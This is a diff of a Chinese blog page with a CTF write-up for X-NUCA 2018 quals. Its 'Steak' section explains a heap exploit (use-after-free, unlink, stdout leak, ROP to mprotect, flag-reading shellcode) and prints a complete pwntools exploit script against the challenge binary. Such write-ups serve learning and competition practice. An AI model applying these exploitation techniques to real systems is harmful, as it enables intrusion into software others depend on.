@@ -119,23 +119,20 @@
 
 
 
-  <meta name="description" content="Code_Interpreter 程序逻辑为读取code文件里的数据流,然后根据关键函数操作.   跟踪数据流得出表达式.   获得flag. Steak IDA分析,有两个漏洞点.     delete函数存在uaf,edit存在overlop.直接unlink使buf = buf - 0x18. 利用copy函数任意读写将stdout置于可控区域,修改stdout">
+  <meta name="description" content="Code_Interpreter 程序逻辑为读取code文件里的数据流,然后根据关键函数操作.  跟踪数据流得出表达式获得flag.  Steak delete函数存在uaf,edit存在overlop.直接unlink使buf = buf - 0x18. 利用copy函数任意读写将stdout置于可控区域,修改stdout的_IO_write_base指针到想泄露的内存区域. 开">
 <meta name="keywords" content="Jeopardy">
 <meta property="og:type" content="article">
 <meta property="og:title" content="writeup-xnuca-2018-quals">
 <meta property="og:url" content="https://hitworld.github.io/posts/659cbaf1/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="Code_Interpreter 程序逻辑为读取code文件里的数据流,然后根据关键函数操作.   跟踪数据流得出表达式.   获得flag. Steak IDA分析,有两个漏洞点.     delete函数存在uaf,edit存在overlop.直接unlink使buf = buf - 0x18. 利用copy函数任意读写将stdout置于可控区域,修改stdout">
+<meta property="og:description" content="Code_Interpreter 程序逻辑为读取code文件里的数据流,然后根据关键函数操作.  跟踪数据流得出表达式获得flag.  Steak delete函数存在uaf,edit存在overlop.直接unlink使buf = buf - 0x18. 利用copy函数任意读写将stdout置于可控区域,修改stdout的_IO_write_base指针到想泄露的内存区域. 开">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://hitworld.github.io/posts/659cbaf1/2.png">
 <meta property="og:image" content="https://hitworld.github.io/posts/659cbaf1/1.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/659cbaf1/3.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/659cbaf1/4.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/659cbaf1/5.png">
-<meta property="og:updated_time" content="2020-08-25T11:40:29.691Z">
+<meta property="og:updated_time" content="2020-08-26T07:07:39.229Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-xnuca-2018-quals">
-<meta name="twitter:description" content="Code_Interpreter 程序逻辑为读取code文件里的数据流,然后根据关键函数操作.   跟踪数据流得出表达式.   获得flag. Steak IDA分析,有两个漏洞点.     delete函数存在uaf,edit存在overlop.直接unlink使buf = buf - 0x18. 利用copy函数任意读写将stdout置于可控区域,修改stdout">
+<meta name="twitter:description" content="Code_Interpreter 程序逻辑为读取code文件里的数据流,然后根据关键函数操作.  跟踪数据流得出表达式获得flag.  Steak delete函数存在uaf,edit存在overlop.直接unlink使buf = buf - 0x18. 利用copy函数任意读写将stdout置于可控区域,修改stdout的_IO_write_base指针到想泄露的内存区域. 开">
 <meta name="twitter:image" content="https://hitworld.github.io/posts/659cbaf1/2.png">
 
 
@@ -502,7 +499,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">3.7k</span>
+                <span title="本文字数">3.6k</span>
               
 
               
@@ -539,27 +536,14 @@
         <h2 id="code_interpreter">Code_Interpreter</h2>
 <p>程序逻辑为读取<code>code</code>文件里的数据流,然后根据关键函数操作.</p>
 <img src="/posts/659cbaf1/2.png" title="关键函数">
-<hr>
-<p>跟踪数据流得出表达式.</p>
+<p>跟踪数据流得出表达式获得<code>flag</code>.</p>
 <img src="/posts/659cbaf1/1.png" title="表达式">
-<hr>
-<p>获得<code>flag</code>.</p>
 <h2 id="steak">Steak</h2>
-<p><code>IDA</code>分析,有两个漏洞点.</p>
-<img src="/posts/659cbaf1/3.png" title="delete函数">
-<hr>
-<img src="/posts/659cbaf1/4.png" title="edit函数">
-<hr>
 <p><code>delete</code>函数存在<code>uaf</code>,<code>edit</code>存在<code>overlop</code>.直接<code>unlink</code>使<code>buf = buf - 0x18</code>.</p>
 <p>利用<code>copy</code>函数任意读写将<code>stdout</code>置于可控区域,修改<code>stdout</code>的<code>_IO_write_base</code>指针到想泄露的内存区域.</p>
-<img src="/posts/659cbaf1/5.png" title="copy函数">
-<hr>
 <p>开始使用的是劫持<code>__malloc_hook</code>到<code>one_gadget</code>,条件不足.</p>
 <p>然后泄露<code>environ</code>并根据偏移算出<code>main</code>函数返回地址所在的栈地址,使用<code>ROP</code>调用<code>mprotect</code>修改<code>bss</code>的页属性写<code>shellcode</code>,<code>getshell</code>失败.最后复现使用<code>open</code>读取<code>flag</code>文件.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x6021A0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,buf)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'size:\n'</span>, str(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'buf:\n'</span>, buf)</span><br><span class="line">    r.recvuntil(<span class="string">'&gt;\n'</span>, timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index:\n'</span>, str(index))</span><br><span class="line">    r.recvuntil(<span class="string">'&gt;\n'</span>, timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,buf)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index:\n'</span>, str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'size:\n'</span>, str(size))</span><br><span class="line">    r.sendafter(<span class="string">'buf:\n'</span>, buf)</span><br><span class="line">    r.recvuntil(<span class="string">"&gt;\n"</span>, timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy</span><span class="params">(sindex, dindex, length)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index:\n'</span>, str(sindex))</span><br><span class="line">    r.sendlineafter(<span class="string">'index:\n'</span>, str(dindex))</span><br><span class="line">    r.sendlineafter(<span class="string">'length:\n'</span>, str(length))</span><br><span class="line">    r.recvuntil(<span class="string">'&gt;\n'</span>,timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">'./steak'</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.23.so"</span>&#125;)</span><br><span class="line"><span class="comment"># r = remote("106.75.115.249", "39453")</span></span><br><span class="line">r.recvuntil(<span class="string">'&gt;\n'</span>, timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">"1"</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">"1"</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">"1"</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload  = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(buf - <span class="number">0x18</span>) + p64(buf - <span class="number">0x10</span>) + <span class="string">"a"</span> * <span class="number">0x70</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0xb0</span>, payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># buf = &amp;buf - 0x18</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x120</span>, <span class="string">"1"</span>)<span class="comment">#3</span></span><br><span class="line">payload  = p64(<span class="number">0x6021A0</span>) * <span class="number">4</span> + p64(<span class="number">0x602180</span>) + p64(<span class="number">0x6021c0</span>) + p64(<span class="number">0x602500</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x40</span>, payload)</span><br><span class="line">copy(<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment"># 4 -&gt; _IO-2_1_stdout_</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xfbad3887</span>) + <span class="string">"\x11"</span> * <span class="number">24</span> + <span class="string">"\x40"</span></span><br><span class="line"><span class="comment">#根据相对偏移溢出_IO_write_base</span></span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'index:\n'</span>, str(<span class="number">4</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'size:\n'</span>, str(<span class="number">0x28</span>))</span><br><span class="line">r.sendafter(<span class="string">'buf:\n'</span>, payload)</span><br><span class="line">data = r.recvuntil(<span class="string">"&gt;\n"</span>)</span><br><span class="line">libc = u64(data[:<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x3c5640</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc: "</span> + hex(libc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(libc + 0x45216) + p64(libc + 0x3c4b10)</span></span><br><span class="line"><span class="comment"># edit(2, 0x20, payload)</span></span><br><span class="line"><span class="comment"># # 4 -&gt; one_gadget,5 -&gt; __malloc_hook</span></span><br><span class="line"><span class="comment"># copy(2, 5, 8)</span></span><br><span class="line"><span class="comment"># r.sendline('1')</span></span><br><span class="line"><span class="comment"># r.sendlineafter('size:\n', str(16))</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xfbad3887</span>) + <span class="string">"\x11"</span> * <span class="number">24</span> + p64(libc + <span class="number">0x3c6f38</span>) + p64(libc + <span class="number">0x3c6f40</span>)</span><br><span class="line"><span class="comment"># 根据libc地址 + 偏移溢出_IO_write_base</span></span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'index:\n'</span>, str(<span class="number">4</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'size:\n'</span>, str(<span class="number">0x30</span>))</span><br><span class="line">r.sendafter(<span class="string">'buf:\n'</span>, payload)</span><br><span class="line">data = r.recvuntil(<span class="string">"&gt;\n"</span>)</span><br><span class="line">stack = u64(data[:<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0xf0</span></span><br><span class="line"><span class="comment">#调试得出main函数返回地址的栈地址</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack: "</span> + hex(stack)</span><br><span class="line"></span><br><span class="line">payload = p64(stack)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x10</span>, payload)</span><br><span class="line"><span class="comment"># 4-&gt;stack</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(libc + 0x45216)</span></span><br><span class="line"><span class="comment">#r.sendline('3')</span></span><br><span class="line"><span class="comment">#r.sendlineafter('index:\n', str(4))</span></span><br><span class="line"><span class="comment">#r.sendlineafter('size:\n', str(0x10))</span></span><br><span class="line"><span class="comment">#r.sendafter('buf:\n', payload)</span></span><br><span class="line"><span class="comment">#r.sendline('0')</span></span><br><span class="line"></span><br><span class="line">x86_shellcode = asm(<span class="string">"mov eax, 0x5; mov ebx, 0x602600; mov ecx, 0; int 0x80; mov ebx, eax; mov eax, 3; mov ecx, 0x602700; mov edx, 0x40; int 0x80; mov eax, 4; mov ebx, 1; mov ecx, 0x602700; mov edx, 0x40; int 0x80"</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x100</span>, x86_shellcode)</span><br><span class="line">payload  = p64(<span class="number">0x6021A0</span>) + p64(<span class="number">0x602180</span>) + p64(<span class="number">0x6021c0</span>) + p64(<span class="number">0x602600</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x30</span>, payload)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x10</span>, <span class="string">"flag"</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400ca3</span></span><br><span class="line"><span class="comment"># pop rdi;ret</span></span><br><span class="line">pprsi = <span class="number">0x400ca1</span></span><br><span class="line"><span class="comment"># pop rsi; pop r15;ret</span></span><br><span class="line">pop_rdx = <span class="number">0x1b92</span> + libc</span><br><span class="line"><span class="comment"># pop rdx; ret</span></span><br><span class="line">payload = p64(pop_rdi) + p64(<span class="number">0x602000</span>) + p64(pprsi) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">7</span>) + p64(libc + <span class="number">0x101770</span>) + p64(<span class="number">0x602500</span>)</span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'index:\n'</span>, str(<span class="number">4</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'size:\n'</span>, str(<span class="number">0x50</span>))</span><br><span class="line">r.sendafter(<span class="string">'buf:\n'</span>, payload)</span><br><span class="line">r.sendlineafter(<span class="string">'&gt;\n'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p>打印出<code>flag</code>.</p>
-<h2 id="gets">gets</h2>
-<p>同<code>deaslr</code>.</p>
 
       
     </div>
@@ -682,7 +666,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">172</span>
+                    <span class="site-state-item-count">171</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -874,7 +858,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#code_interpreter"><span class="nav-number">1.</span> <span class="nav-text">Code_Interpreter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#steak"><span class="nav-number">2.</span> <span class="nav-text">Steak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gets"><span class="nav-number">3.</span> <span class="nav-text">gets</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#code_interpreter"><span class="nav-number">1.</span> <span class="nav-text">Code_Interpreter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#steak"><span class="nav-number">2.</span> <span class="nav-text">Steak</span></a></li></ol></div>
             
 
           </div>
@@ -906,7 +890,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">727k</span>
+    <span title="站点总字数">705k</span>
   
 
   
@@ -915,7 +899,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">11:01</span>
+    <span title="站点阅读时长">10:41</span>
   
 </div>
 
